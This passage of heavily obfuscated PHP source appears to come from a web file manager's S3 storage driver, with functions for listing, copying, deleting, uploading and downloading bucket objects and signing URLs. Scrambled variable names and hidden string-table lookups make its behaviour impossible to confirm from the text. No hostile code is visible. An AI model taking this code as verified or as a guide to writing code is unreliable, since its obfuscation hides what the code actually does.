$øùÕºó[$›¹¶‰·Ø[84]]); $Öí¿ã™† = array_to_keyvalue($øùÕºó, $›¹¶‰·Ø[33], $›¹¶‰·Ø[28]); $½Éñº« = $›¹¶‰·Ø[105] . get_path_ext($üÆïŞ¼µ); $½Éñº« = $½Éñº« == $›¹¶‰·Ø[105] || $ÇØËµ½Ã ? $›¹¶‰·Ø[33] : $½Éñº«; $¨’±Š‹ = substr($üÆïŞ¼µ, 0, strlen($üÆïŞ¼µ) - strlen($½Éñº«)); $ÜĞÒ²ñÒ = $¨’±Š‹ . "\50\x30\x29{$½Éñº«}"; for ($Çø™­¶ = 1; $Çø™­¶ <= count($Öí¿ã™†) + 1; $Çø™­¶++) { $ÜĞÒ²ñÒ = $¨’±Š‹ . "\50{$Çø™­¶}\51{$½Éñº«}"; if (!in_array_not_case($ÜĞÒ²ñÒ, $Öí¿ã™†)) { return $ÜĞÒ²ñÒ; } } return $ÜĞÒ²ñÒ; } public function listAllFiles($óÀÈ¢Ù, $„¸¦±·», $—ÌûâğÊ = array()) { $ğ†·ÂëŒ =& $_SERVER[Á÷ ­Šë]; if (empty($„¸¦±·»)) { return array(); } $˜ ÍÊ®¹ = array(); $óÀÈ¢Ù = trim($óÀÈ¢Ù, $ğ†·ÂëŒ[8]); foreach ($„¸¦±·» as $Ëêıä) { $ª¯‹©â = ltrim(substr(trim($Ëêıä, $ğ†·ÂëŒ[8]), strlen($óÀÈ¢Ù)), $ğ†·ÂëŒ[8]); $˜ ÍÊ®¹ = array_merge($˜ ÍÊ®¹, $this->slicePath($ª¯‹©â)); } $ø²Œí÷Ä = array(); foreach (array_unique($˜ ÍÊ®¹) as $Ëêıä) { $½ÅÈÄÁŸ = array($ğ†·ÂëŒ[86] => $this->getPathOuter($ğ†·ÂëŒ[8] . $óÀÈ¢Ù . $ğ†·ÂëŒ[8] . $Ëêıä), $ğ†·ÂëŒ[87] => 1, $ğ†·ÂëŒ[88] => 0); if (substr($Ëêıä, -1) != $ğ†·ÂëŒ[8]) { $½ÅÈÄÁŸ[$ğ†·ÂëŒ[87]] = 0; $èç„ñÓé = $this->getPath($óÀÈ¢Ù . $ğ†·ÂëŒ[8] . $Ëêıä); $½ÅÈÄÁŸ[$ğ†·ÂëŒ[88]] = isset($—ÌûâğÊ[$èç„ñÓé]) ? $—ÌûâğÊ[$èç„ñÓé] : $this->size($èç„ñÓé); } $ø²Œí÷Ä[] = $½ÅÈÄÁŸ; } return $ø²Œí÷Ä; } public function slicePath($…áô¦İ¢) { $ˆ‡¾–Ú =& $_SERVER[Á÷ ­Šë]; $¿ÑôÊãÔ = explode($ˆ‡¾–Ú[8], trim($…áô¦İ¢, $ˆ‡¾–Ú[8])); $ÏÊè™ÎÎ = 0; do { ++$ÏÊè™ÎÎ; $ÏÍøì®[] = implode($ˆ‡¾–Ú[8], array_slice($¿ÑôÊãÔ, 0, $ÏÊè™ÎÎ)) . $ˆ‡¾–Ú[8]; } while ($ÏÊè™ÎÎ < count($¿ÑôÊãÔ)); $ÏÍøì®[count($¿ÑôÊãÔ) - 1] = $…áô¦İ¢; return $ÏÍøì®; } public function getHost() { $ä¬œèêŸ =& $_SERVER[Á÷ ­Šë]; $Â€ü·÷› = parse_url(trim($this->domain, $ä¬œèêŸ[8])); $×¿ Èèˆ = isset($Â€ü·÷›[$ä¬œèêŸ[184]]) ? $Â€ü·÷›[$ä¬œèêŸ[184]] : http_type(); $™ğËÆâ„ = isset($Â€ü·÷›[$ä¬œèêŸ[185]]) ? $Â€ü·÷›[$ä¬œèêŸ[185]] : $Â€ü·÷›[$ä¬œèêŸ[86]]; if (isset($Â€ü·÷›[$ä¬œèêŸ[186]])) { $™ğËÆâ„ .= $ä¬œèêŸ[4] . $Â€ü·÷›[$ä¬œèêŸ[186]]; } return $×¿ Èèˆ . $ä¬œèêŸ[187] . $™ğËÆâ„; } public function pathEncode($™‰Š¯Ñ¹) { $Šï£†İ§ =& $_SERVER[Á÷ ­Šë]; return str_replace($Šï£†İ§[188], $Šï£†İ§[8], rawurlencode($™‰Š¯Ñ¹)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($Ÿòäß„) { set_timeout(); require_once SDK_DIR . $_SERVER[Á÷ ­Šë][189]; parent::__construct(); $this->_init($Ÿòäß„); } public function _init($¿Œ…ØËÎ) { foreach ($¿Œ…ØËÎ as $å°ŠœĞ => $ï¯äË€ì) { if (isset($this->{$å°ŠœĞ})) { $this->{$å°ŠœĞ} = $ï¯äË€ì; } } $this->endpoint = $¿Œ…ØËÎ[$_SERVER[Á÷ ­Šë][190]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($ğË¥Šı‚ = "\166\x34") { $this->signVer = $ğË¥Šı‚; $this->client->setSignatureVersion($ğË¥Šı‚); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $Å£—šÊ =& $_SERVER[Á÷ ­Šë]; $íÙÏ®¸Ã = $this->getBucketCors(); if (!$íÙÏ®¸Ã || !is_array($íÙÏ®¸Ã)) { return !1; } if ($íÙÏ®¸Ã[$Å£—šÊ[191]] != $Å£—šÊ[192] || $íÙÏ®¸Ã[$Å£—šÊ[193]] != $Å£—šÊ[192]) { return !1; } $¡ë¥Ë¤Ì = array_map($Å£—šÊ[194], $íÙÏ®¸Ã[$Å£—šÊ[195]]); if (!is_array($¡ë¥Ë¤Ì)) { $¡ë¥Ë¤Ì = array(); } $­µœÙ­ = array($Å£—šÊ[196], $Å£—šÊ[197], $Å£—šÊ[198], $Å£—šÊ[199], $Å£—šÊ[200]); $“äÈ˜ñ = array_diff($­µœÙ­, $¡ë¥Ë¤Ì); return empty($“äÈ˜ñ); } public function mkfile($¶¨ØÏõË, $ˆ²£ä–¡ = '', $“†–ã·ü = REPEAT_RENAME) { $¼«Ö÷Í = $this->setContent($¶¨ØÏõË, $ˆ²£ä–¡); if ($¼«Ö÷Í !== !1) { return $this->getPathOuter($¶¨ØÏõË); } return !1; } public function mkdir($–×€àÒä, $ëû±è¢ = REPEAT_SKIP) { $ úæ»”Ã =& $_SERVER[Á÷ ­Šë]; if (empty($–×€àÒä) && $–×€àÒä !== $ úæ»”Ã[201]) { return !1; } if ($this->_isFolder($–×€àÒä)) { return $this->getPathOuter($–×€àÒä); } $å˜¬¬È = $this->setContent($–×€àÒä, $ úæ»”Ã[33], !0); if ($å˜¬¬È !== !1) { return $this->getPathOuter($–×€àÒä); } return !1; } public function copyFile($Ó—İéºò, $£›’Ì­ñ, $á¢´ËÜÎ = array()) { $ã®›¡ä =& $_SERVER[Á÷ ­Šë]; $®¥¥ƒı² = $this->objectMeta($Ó—İéºò); if (!$®¥¥ƒı²) { return !1; } if ($®¥¥ƒı²[$ã®›¡ä[88]] <= 1024 * 1024 * 200) { $Üš²´Ê = $this->client->copyObject($this->bucket, $Ó—İéºò, $this->bucket, $£›’Ì­ñ, $ã®›¡ä[202], $á¢´ËÜÎ); } else { $Üš²´Ê = $this->client->multiCopyObject($this->bucket, $Ó—İéºò, $this->bucket, $£›’Ì­ñ, $á¢´ËÜÎ); } $Üš²´Ê = $Üš²´Ê ? $this->getPathOuter($£›’Ì­ñ) : !1; return $Üš²´Ê; } public function moveFile($üŸñˆó€, $‚Ñ‰Ô¿ç) { if ($this->copyFile($üŸñˆó€, $‚Ñ‰Ô¿ç)) { $this->delFile($üŸñˆó€); return $this->getPathOuter($‚Ñ‰Ô¿ç); } return !1; } public function delFile($¨ç«ÈŒï) { return $this->client->deleteObject($this->bucket, $¨ç«ÈŒï); } public function delFolder($çÛŒ¶Î) { $¦´ƒß£ =& $_SERVER[Á÷ ­Šë]; if (!$this->exist($çÛŒ¶Î)) { return !0; } $this->listItemCache = !1; $…ÜŞÀÄË = $this->fileList($çÛŒ¶Î); $this->listItemCache = !0; $²—™áû¢ = trim($çÛŒ¶Î, $¦´ƒß£[8]) . $¦´ƒß£[8]; if (!empty($çÛŒ¶Î) && $çÛŒ¶Î !== $¦´ƒß£[201] && !in_array($²—™áû¢, $…ÜŞÀÄË[$¦´ƒß£[85]])) { $…ÜŞÀÄË[$¦´ƒß£[85]][] = $²—™áû¢; } $»ÍÍ½¤ = $this->delByBatch($…ÜŞÀÄË[$¦´ƒß£[84]]); if (!$»ÍÍ½¤) { return !1; } $»ÍÍ½¤ = $this->delByBatch($…ÜŞÀÄË[$¦´ƒß£[85]]); if (!$»ÍÍ½¤) { return !1; } return $this->delFile($²—™áû¢); } private function delByBatch($Ç€ææº) { foreach (array_chunk($Ç€ææº, 1000) as $úäÒ¿Š) { $£ôÔ½‚ = $this->client->deleteObjects($this->bucket, $úäÒ¿Š); if (!$£ôÔ½‚) { return !1; } } return !0; } public function rename($îÖË°¢, $ß¸Úáê) { return $this->renameObject($îÖË°¢, $ß¸Úáê); } public function listPath($ê¾ÎÔÂÂ, $şİıàñ = false) { $ª–öÜ®Í =& $_SERVER[Á÷ ­Šë]; $”ïÙ¨×ô = $this->fileList($ê¾ÎÔÂÂ, $ª–öÜ®Í[8], !0); foreach ($”ïÙ¨×ô[$ª–öÜ®Í[85]] as $­‘Üæ·ä => $ÖêĞ¯ºû) { $”ïÙ¨×ô[$ª–öÜ®Í[85]][$­‘Üæ·ä] = $this->folderInfo($ÖêĞ¯ºû, $şİıàñ); } foreach ($”ïÙ¨×ô[$ª–öÜ®Í[84]] as $­‘Üæ·ä => $ÖêĞ¯ºû) { $”ïÙ¨×ô[$ª–öÜ®Í[84]][$­‘Üæ·ä] = $this->fileInfo($ÖêĞ¯ºû[$ª–öÜ®Í[28]], $şİıàñ, $ÖêĞ¯ºû); } return $”ïÙ¨×ô; } private function fileInfo($’ºº­èë, $Èø¶¶ºø = false, $Æˆ¸½ŠÛ = array()) { $åƒ˜õı… =& $_SERVER[Á÷ ­Šë]; $©ÂøŞİ = array($åƒ˜õı…[28] => $this->pathThis($’ºº­èë), $åƒ˜õı…[86] => $this->getPathOuter($’ºº­èë), $åƒ˜õı…[29] => $åƒ˜õı…[203], $åƒ˜õı…[178] => $this->ext($’ºº­èë), $åƒ˜õı…[88] => isset($Æˆ¸½ŠÛ[$åƒ˜õı…[88]]) ? $Æˆ¸½ŠÛ[$åƒ˜õı…[88]] : 0); if ($Èø¶¶ºø) { return $©ÂøŞİ; } $©ÂøŞİ[$åƒ˜õı…[204]] = $©ÂøŞİ[$åƒ˜õı…[94]] = 0; $©ÂøŞİ[$åƒ˜õı…[205]] = $©ÂøŞİ[$åƒ˜õı…[206]] = !0; if (empty($Æˆ¸½ŠÛ)) { $Æˆ¸½ŠÛ = $this->objectMeta($’ºº­èë); if (!$Æˆ¸½ŠÛ) { return $©ÂøŞİ; } } if (isset($Æˆ¸½ŠÛ[$åƒ˜õı…[207]])) { $©ÂøŞİ[$åƒ˜õı…[94]] = $Æˆ¸½ŠÛ[$åƒ˜õı…[207]]; } if (isset($Æˆ¸½ŠÛ[$åƒ˜õı…[88]])) { $©ÂøŞİ[$åƒ˜õı…[88]] = $Æˆ¸½ŠÛ[$åƒ˜õı…[88]]; } return $©ÂøŞİ; } private function folderInfo($æ›áÑ„ , $¯ÆƒÙÎ = false) { $Í½ôĞÜÉ =& $_SERVER[Á÷ ­Šë]; $ÄĞë¥å® = array($Í½ôĞÜÉ[28] => $this->pathThis($æ›áÑ„ ), $Í½ôĞÜÉ[86] => $this->getPathOuter($Í½ôĞÜÉ[8] . $æ›áÑ„ ), $Í½ôĞÜÉ[29] => $Í½ôĞÜÉ[87]); if ($¯ÆƒÙÎ) { return $ÄĞë¥å®; } $ÄĞë¥å®[$Í½ôĞÜÉ[204]] = $ÄĞë¥å®[$Í½ôĞÜÉ[94]] = 0; $ÄĞë¥å®[$Í½ôĞÜÉ[205]] = $ÄĞë¥å®[$Í½ôĞÜÉ[206]] = !0; if ($æ›áÑ„  == $Í½ôĞÜÉ[33]) { return $ÄĞë¥å®; } $æ›áÑ„  = trim($æ›áÑ„ , $Í½ôĞÜÉ[8]) . $Í½ôĞÜÉ[8]; $ ğÔ°Êš = $this->objectMeta($æ›áÑ„ ); if (isset($ ğÔ°Êš[$Í½ôĞÜÉ[207]])) { $ÄĞë¥å®[$Í½ôĞÜÉ[204]] = $ ğÔ°Êš[$Í½ôĞÜÉ[207]]; } return $ÄĞë¥å®; } private function fileList($Šî¾ğ‡¿, $¨Èşƒß = '', $Ê¤øœÜ» = 0) { $­Œ³ËÉ» =& $_SERVER[Á÷ ­Šë]; $”‡–”šÔ = rtrim($Šî¾ğ‡¿, $­Œ³ËÉ»[8]) . $­Œ³ËÉ»[8]; $ï×ñå“ = $this->listObjs($”‡–”šÔ, null, null, $¨Èşƒß); if (!$ï×ñå“) { return array($­Œ³ËÉ»[85] => array(), $­Œ³ËÉ»[84] => array()); } $‡¼ôè÷ = $this->listItemCache === !1 ? !1 : !0; $ÊÀò”­¼ = $ÅÀá£³ = array(); foreach ($ï×ñå“[$­Œ³ËÉ»[208]] as $ğæ©§ËË) { $¨³ÇçÃ· = $ğæ©§ËË[$­Œ³ËÉ»[28]]; if ($¨³ÇçÃ· == $”‡–”šÔ) { continue; } $•ØÎ¶è¶ = isset($ğæ©§ËË[$­Œ³ËÉ»[88]]) ? $ğæ©§ËË[$­Œ³ËÉ»[88]] : 0; $æ¤Õ¼§ = $•ØÎ¶è¶ == 0 && substr($¨³ÇçÃ·, strlen($¨³ÇçÃ·) - 1, 1) == $­Œ³ËÉ»[8] ? !0 : !1; if ($‡¼ôè÷) { $this->cacheMethod($­Œ³ËÉ»[209], $¨³ÇçÃ·, $æ¤Õ¼§); $this->cacheMethod($­Œ³ËÉ»[210], $¨³ÇçÃ·, $ğæ©§ËË); } if ($æ¤Õ¼§) { $ÊÀò”­¼[] = $¨³ÇçÃ·; continue; } $ÅÀá£³[] = $Ê¤øœÜ» ? $ğæ©§ËË : $¨³ÇçÃ·; } foreach ($ï×ñå“[$­Œ³ËÉ»[211]] as $ğæ©§ËË) { $ÊÀò”­¼[] = $ğæ©§ËË[$­Œ³ËÉ»[28]]; if ($‡¼ôè÷) { $this->cacheMethod($­Œ³ËÉ»[209], $ğæ©§ËË[$­Œ³ËÉ»[28]], !0); } } if ($‡¼ôè÷) { $this->cacheMethod($­Œ³ËÉ»[209], $Šî¾ğ‡¿, !0); } return array($­Œ³ËÉ»[85] => $ÊÀò”­¼, $­Œ³ËÉ»[84] => $ÅÀá£³); } private function listObjs($§İÖïæÉ, $˜ê½†œ = null, $Î¢‹ø¸³ = null, $Ù¤Ë¦ùò = null) { $şÉú€· =& $_SERVER[Á÷ ­Šë]; $§İÖïæÉ = trim($§İÖïæÉ, $şÉú€·[8]); $¡ŸÖÒÁœ = empty($§İÖïæÉ) && $§İÖïæÉ !== $şÉú€·[201] ? $şÉú€·[33] : $§İÖïæÉ . $şÉú€·[8]; return $this->client->getBucket($this->bucket, $¡ŸÖÒÁœ, $˜ê½†œ, $Î¢‹ø¸³, $Ù¤Ë¦ùò, !0); } public function has($¿‡æ§íú, $Ä– Î¼Í = false, $îá£Ìâ = true) { $‰ÑˆË˜‚ =& $_SERVER[Á÷ ­Šë]; $¿‡æ§íú = trim($¿‡æ§íú, $‰ÑˆË˜‚[8]); $…¹ ‡ = empty($¿‡æ§íú) && $¿‡æ§íú !== $‰ÑˆË˜‚[201] ? $‰ÑˆË˜‚[33] : $¿‡æ§íú . $‰ÑˆË˜‚[8]; $àø¢‘Û = null; $øÌ±•âŒ = 500; $Ñ¦§”ÄÖ = $‰ÑˆË˜‚[8]; $¾ùĞóûæ = $¼‚ÛçŸÚ = array(); while (!0) { $Ò¼°²çó = $this->listObjs($¿‡æ§íú, $àø¢‘Û, $øÌ±•âŒ, $Ñ¦§”ÄÖ); if (!$Ò¼°²çó) { break; } $àø¢‘Û = $Ò¼°²çó[$‰ÑˆË˜‚[212]]; $ÇôìÊê· = $Ò¼°²çó[$‰ÑˆË˜‚[208]]; $¾› Òê = $Ò¼°²çó[$‰ÑˆË˜‚[211]]; if (empty($ÇôìÊê·) && empty($¾› Òê)) { break; } if (count($ÇôìÊê·) == 1 && $ÇôìÊê·[0][$‰ÑˆË˜‚[28]] == $…¹ ‡) { break; } if ($Ä– Î¼Í) { if (count($ÇôìÊê·)) { $ÇôìÊê· = array_column($ÇôìÊê·, $‰ÑˆË˜‚[28]); $¾ùĞóûæ = array_merge($¾ùĞóûæ, $ÇôìÊê·); } if (count($¾› Òê)) { $¾› Òê = array_column($¾› Òê, $‰ÑˆË˜‚[28]); $¼‚ÛçŸÚ = array_merge($¼‚ÛçŸÚ, $¾› Òê); } if ($àø¢‘Û === null) { break; } continue; } if ($îá£Ìâ) { if (!empty($ÇôìÊê·)) { if (count($ÇôìÊê·) > 1 || isset($ÇôìÊê·[0][$‰ÑˆË˜‚[28]]) && $ÇôìÊê·[0][$‰ÑˆË˜‚[28]] != $…¹ ‡) { return !0; } } } else { if (!empty($¾› Òê)) { return !0; } } if ($àø¢‘Û === null) { break; } } if ($Ä– Î¼Í) { $¾ùĞóûæ = array_diff($¾ùĞóûæ, array($…¹ ‡)); $¾ùĞóûæ = count(array_unique($¾ùĞóûæ)); $¼‚ÛçŸÚ = count(array_unique($¼‚ÛçŸÚ)); return array($‰ÑˆË˜‚[213] => $¾ùĞóûæ, $‰ÑˆË˜‚[214] => $¼‚ÛçŸÚ); } return !1; } public function listAll($¤ı„¶í¿) { $Æ²ßàƒî =& $_SERVER[Á÷ ­Šë]; $Ç¾¥‘°¿ = $this->fileList($¤ı„¶í¿, $Æ²ßàƒî[33], !0); $–­»îÈï = array(); foreach ($Ç¾¥‘°¿[$Æ²ßàƒî[84]] as $ÕÉù§¼) { $–­»îÈï[$ÕÉù§¼[$Æ²ßàƒî[28]]] = $ÕÉù§¼[$Æ²ßàƒî[88]]; } foreach ($Ç¾¥‘°¿[$Æ²ßàƒî[85]] as $ÕÉù§¼) { if (is_string($ÕÉù§¼)) { $–­»îÈï[$ÕÉù§¼] = 0; } } return $this->listAllFiles($¤ı„¶í¿, array_keys($–­»îÈï), $–­»îÈï); } public function canRead($ôúÇÄïÅ) { $ÃŒÅÃ§ş =& $_SERVER[Á÷ ­Šë]; $ŞôÏ¡ˆì = $this->client->getAccessControlPolicy($this->bucket, $ôúÇÄïÅ); if (!$ŞôÏ¡ˆì) { return !1; } return in_array($ŞôÏ¡ˆì, array($ÃŒÅÃ§ş[215], $ÃŒÅÃ§ş[216], $ÃŒÅÃ§ş[217])) ? !0 : !1; } public function canWrite($³‚†ü¹¥) { $êÃõ¯¹ =& $_SERVER[Á÷ ­Šë]; $È˜Ÿ½µÜ = $this->client->getAccessControlPolicy($this->bucket, $³‚†ü¹¥); if (!$È˜Ÿ½µÜ) { return !1; } return in_array($È˜Ÿ½µÜ, array($êÃõ¯¹[215], $êÃõ¯¹[216])) ? !0 : !1; } public function getContent($­»ÙƒßÚ) { return $this->client->getObject($this->bucket, $­»ÙƒßÚ); } public function setContent($¼’ÖÊ¶Ï, $ÖÕÂìàÕ = '', $€Ô°Òô‚ = false) { $ìñ·ØÉÕ =& $_SERVER[Á÷ ­Šë]; $¼’ÖÊ¶Ï = $€Ô°Òô‚ ? trim($¼’ÖÊ¶Ï, $ìñ·ØÉÕ[8]) . $ìñ·ØÉÕ[8] : $¼’ÖÊ¶Ï; $å¸² Ê› = get_file_mime(get_path_ext($¼’ÖÊ¶Ï)); $ˆÕÂ¼¸‹ = $this->client->putObject($ÖÕÂìàÕ, $this->bucket, $¼’ÖÊ¶Ï, $ìñ·ØÉÕ[202], array(), $å¸² Ê›); if (!$ˆÕÂ¼¸‹) { return !1; } if ($€Ô°Òô‚) { return !0; } $this->cacheMethod(null, null); $ˆÕÂ¼¸‹ = $this->copyFile($¼’ÖÊ¶Ï, $¼’ÖÊ¶Ï, array($ìñ·ØÉÕ[218] => $ˆÕÂ¼¸‹[$ìñ·ØÉÕ[219]])); return $ˆÕÂ¼¸‹ ? !0 : !1; } public function fileSubstr($ºê„””š, $‹©é‡Œ¦, $Ïè”’´Ó) { $ãÏìÂ = $‹©é‡Œ¦ + $Ïè”’´Ó - 1; return $this->client->getObject($this->bucket, $ºê„””š, array($_SERVER[Á÷ ­Šë][220] => "\142\x79\x74\145\x73\75{$‹©é‡Œ¦}\55{$ãÏìÂ}")); } public function upload($±æ³ÄÂ, $Æ®¢¶¾, $¢ÎĞ‡ıô = false, $¦ÆÏ°«æ = REPEAT_REPLACE) { $ÃìÓï²¡ =& $_SERVER[Á÷ ­Šë]; $ò—Àë•° = array($ÃìÓï²¡[218] => @md5_file($Æ®¢¶¾)); $ëé£êÜ = array($ÃìÓï²¡[221] => get_file_mime(get_path_ext($±æ³ÄÂ))); if (IO::size($Æ®¢¶¾) <= 1024 * 1024 * 200) { $•£ÄãÕ = $this->client->putObjectFile($Æ®¢¶¾, $this->bucket, $±æ³ÄÂ, $ÃìÓï²¡[202], $ò—Àë•°, $ëé£êÜ); return !empty($•£ÄãÕ) ? $this->getPathOuter($±æ³ÄÂ) : !1; } $Æ¬ö˜Ø = $this->client->multiUploadObject($Æ®¢¶¾, $this->bucket, trim($±æ³ÄÂ, $ÃìÓï²¡[8]), $ò—Àë•°, $ëé£êÜ); return $Æ¬ö˜Ø ? $this->getPathOuter($±æ³ÄÂ) : !1; } public function download($ò€ñ·øŠ, $µÇÆµ×É) { if (!@is_dir($this->pathFather($µÇÆµ×É)) && !IO::mkdir($this->pathFather($µÇÆµ×É))) { return !1; } $Š‚óÏ¸ú = $this->client->getObject($this->bucket, $ò€ñ·øŠ, array(), $µÇÆµ×É); return $Š‚óÏ¸ú !== !1 ? $µÇÆµ×É : !1; } public function link($¦“•Õ‡, $Òßä‹º’ = array()) { $¨¸ÈŸ±° =& $_SERVER[Á÷ ­Šë]; if ($this->signVer == $¨¸ÈŸ±°[222]) { return $this->client->getAuthenticatedURL($this->bucket, $¦“•Õ‡, 3600 * 12, $Òßä‹º’); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($¦“•Õ‡, $¨¸ÈŸ±°[8]), 3600 * 12, $this->region, array(), !0, $Òßä‹º’); } public function fileOut($´Æ’£´, $îíÂ£‡ = false, $±ø™ÚÛ = false, $Ş©ÍšÚê = '') { $™›Ï²´­ =& $_SERVER[Á÷ ­Šë]; if ($this->isFileOutServer()) { return $this->fileOutServer($´Æ’£´, $îíÂ£‡, $±ø™ÚÛ, $Ş©ÍšÚê); } if (!$±ø™ÚÛ) { $±ø™ÚÛ = $this->pathThis($´Æ’£´); } $ô½Â×¢€ = get_file_mime(get_path_ext($±ø™ÚÛ)); if ($ô½Â×¢€ == $™›Ï²´­[223]) { return parent::fileOut($´Æ’£´, $îíÂ£‡, $±ø™ÚÛ, $Ş©ÍšÚê); } $îíÂ£‡ = $îíÂ£‡ ? $™›Ï²´­[224] : $™›Ï²´­[225]; $Ì´‹Â¹Í = array($™›Ï²´­[226] => $îíÂ£‡ . $™›Ï²´­[227] . rawurlencode($±ø™ÚÛ), $™›Ï²´­[228] => $ô½Â×¢€); $Æ“õöÆ¬ = $this->link($´Æ’£´, $Ì´‹Â¹Í); $this->fileOutLink($Æ“õöÆ¬); } public function fileOutServer($ÎÎ€Ÿ¬š, $¿º¶Ï¹ = false, $ªÌ„õ×ö = false, $ÊÛ°Ÿª› = '') { parent::fileOut($ÎÎ€Ÿ¬š, $¿º¶Ï¹, $ªÌ„õ×ö, $ÊÛ°Ÿª›); } public function fileOutImageServer($°±Ößñ´, $ú¨”¡¦á = 250) { parent::fileOutImage($°±Ößñ´, $ú¨”¡¦á); } public function hashMd5($˜¢Æßâä, $êğıæ‘ = '') { $«š‰¦µé =& $_SERVER[Á÷ ­Šë]; $ú§³â• = $this->objectMeta($˜¢Æßâä); if (!$ú§³â•) { return !1; } $êğıæ‘ = $êğıæ‘ ? $êğıæ‘ : _get($ú§³â•, $«š‰¦µé[229]); $êğıæ‘ = $êğıæ‘ ? $êğıæ‘ : _get($ú§³â•, $«š‰¦µé[219], $«š‰¦µé[33]); return $êğıæ‘; } public function uploadFormData($‚Ğî¨õ, $¤ÈŒÓ = 3600) { $ßù‘ÎÙ˜ =& $_SERVER[Á÷ ­Šë]; $”¤ìê‚Ç = $this->pathFather($‚Ğî¨õ); $ãĞ†¢ù = $this->client->getHttpUploadPostParams($this->bucket, $”¤ìê‚Ç, $ßù‘ÎÙ˜[202], $¤ÈŒÓ); return array_merge((array) $ãĞ†¢ù, array($ßù‘ÎÙ˜[185] => $this->getHost())); } public function multiUploadFormData($·¿›ìÄ, $ÚÅÜÔÖ“ = 3600) { $İïŸ¿”Æ =& $_SERVER[Á÷ ­Šë]; $Ï¼šãÙ¬ = gmdate($İïŸ¿”Æ[230]); $Ø‚÷ı© = array(); $íÎÌŞ¬ = $this->client->getUploadId($this->bucket, $·¿›ìÄ, $Ø‚÷ı©); if (!$íÎÌŞ¬) { return !1; } return array($İïŸ¿”Æ[231] => $íÎÌŞ¬, $İïŸ¿”Æ[185] => $this->getHost() . $İïŸ¿”Æ[8] . $this->pathEncode($·¿›ìÄ), $İïŸ¿”Æ[232] => $Ï¼šãÙ¬, $İïŸ¿”Æ[103] => $·¿›ìÄ); } public function multiUploadAuthData($İèƒ„Ğ, $¼î¨À¡ = array()) { $î©÷¬Éç =& $_SERVER[Á÷ ­Šë]; $··ˆ¨Ş• = isset($¼î¨À¡[$î©÷¬Éç[232]]) ? $¼î¨À¡[$î©÷¬Éç[232]] : gmdate($î©÷¬Éç[230]); $ÌŸÔŠ¹ú = isset($¼î¨À¡[$î©÷¬Éç[178]]) ? $¼î¨À¡[$î©÷¬Éç[178]] : $î©÷¬Éç[33]; $Œ¯ø»½¼ = $¼î¨À¡[$î©÷¬Éç[103]]; unset($¼î¨À¡[$î©÷¬Éç[103]]); if (isset($¼î¨À¡[$î©÷¬Éç[233]])) { $¼î¨À¡[$î©÷¬Éç[232]] = $··ˆ¨Ş•; return $this->listUploadParts($Œ¯ø»½¼, $¼î¨À¡); } $Ö ¦­ = array($î©÷¬Éç[234], $î©÷¬Éç[33], $î©÷¬Éç[129], $î©÷¬Éç[33], "\x78\x2d\x61\155\172\55\x64\x61\x74\x65\72{$··ˆ¨Ş•}", $î©÷¬Éç[8] . $this->bucket . $î©÷¬Éç[8] . $this->pathEncode($Œ¯ø»½¼) . $ÌŸÔŠ¹ú); if (strpos($ÌŸÔŠ¹ú, $î©÷¬Éç[235]) === 0) { $Ö ¦­[0] = $î©÷¬Éç[236]; } if (isset($¼î¨À¡[$î©÷¬Éç[237]]) && $¼î¨À¡[$î©÷¬Éç[237]] == $î©÷¬Éç[238]) { $Ö ¦­[0] = $î©÷¬Éç[238]; } $İÌ¬ø¿ò = implode($î©÷¬Éç[62], $Ö ¦­); $ÄÏ‹é« = base64_encode(hash_hmac($î©÷¬Éç[239], $İÌ¬ø¿ò, $this->secret, !0)); $—”ÂÑö = $î©÷¬Éç[240] . $this->accessKey . $î©÷¬Éç[4] . $ÄÏ‹é«; if (strpos($ÌŸÔŠ¹ú, $î©÷¬Éç[235]) === 0) { return array($î©÷¬Éç[241] => $—”ÂÑö, $î©÷¬Éç[232] => $··ˆ¨Ş•); } return $—”ÂÑö; } public function listUploadParts($ ò×¸Ÿ, $¤æ¯ãÉ = array()) { $ººòû»ü =& $_SERVER[Á÷ ­Šë]; $»›‡ñ = str_replace($ººòû»ü[242], $ººòû»ü[33], $¤æ¯ãÉ[$ººòû»ü[178]]); $Íğòşû¿ = $this->client->listParts($this->bucket, $ ò×¸Ÿ, $»›‡ñ); if (!$Íğòşû¿) { return !1; } unset($¤æ¯ãÉ[$ººòû»ü[233]], $¤æ¯ãÉ[$ººòû»ü[237]]); $¤æ¯ãÉ[$ººòû»ü[103]] = $ ò×¸Ÿ; $Œã­Ç¤× = $this->multiUploadAuthData($ ò×¸Ÿ, $¤æ¯ãÉ); if (empty($Œã­Ç¤×)) { return !1; } return array($ººòû»ü[241] => $Œã­Ç¤×, $ººòû»ü[232] => $¤æ¯ãÉ[$ººòû»ü[232]], $ººòû»ü[243] => $Íğòşû¿); } public function getHost() { return parent::getHost() . $_SERVER[Á÷ ­Šë][8] . $this->bucket; } public function size($‰‘Üˆ©Ñ) { $±å¢Êæİ = $this->objectMeta($‰‘Üˆ©Ñ); return $±å¢Êæİ ? $±å¢Êæİ[$_SERVER[Á÷ ­Šë][88]] : 0; } public function info($Ã­¨’˜İ) { if ($this->isFolder($Ã­¨’˜İ)) { return $this->folderInfo($Ã­¨’˜İ); } else { if ($this->isFile($Ã­¨’˜İ)) { return $this->fileInfo($Ã­¨’˜İ); } } return !1; } public function exist($«„ı¼×) { return $this->isFile($«„ı¼×) || $this->isFolder($«„ı¼×); } public function isFile($¾úæØú¹) { return !$this->isFolder($¾úæØú¹) && $this->objectMeta($¾úæØú¹); } public function isFolder($Öú÷¾‰) { return $this->cacheMethod($_SERVER[Á÷ ­Šë][209], $Öú÷¾‰); } protected function objectMeta($•”Ó¬â) { return $this->cacheMethod($_SERVER[Á÷ ­Šë][210], $•”Ó¬â); } protected function _objectMeta($´Ìò’‹³) { $¦¤Ô­«Ö =& $_SERVER[Á÷ ­Šë]; $´Ìò’‹³ = rtrim($´Ìò’‹³, $¦¤Ô­«Ö[8]); try { $¡Ù˜ÜŸ— = $this->client->getObjectInfo($this->bucket, $´Ìò’‹³); if 